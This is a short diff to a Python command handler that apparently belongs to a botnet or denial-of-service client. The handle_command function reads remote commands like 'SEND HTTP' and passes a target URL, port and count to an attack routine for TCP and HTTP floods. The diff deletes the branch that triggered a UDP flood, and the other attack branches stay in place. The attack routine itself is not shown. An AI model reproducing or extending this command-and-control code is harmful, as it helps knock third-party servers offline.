@@ -69,13 +69,6 @@ def handle_command(command):
             n = int(args[4])
             print(url, port)
             attack(url, port, n, "tcp_attack")
-        if command.startswith("SEND UDP"):
-            args = command.split()
-            url = args[2]
-            port = int(args[3])
-            n = int(args[4])
-            print(url, port)
-            attack(url, port, n, "udp_attack")
         if command.startswith("SEND HTTP"):
             args = command.split()
             url = args[2]
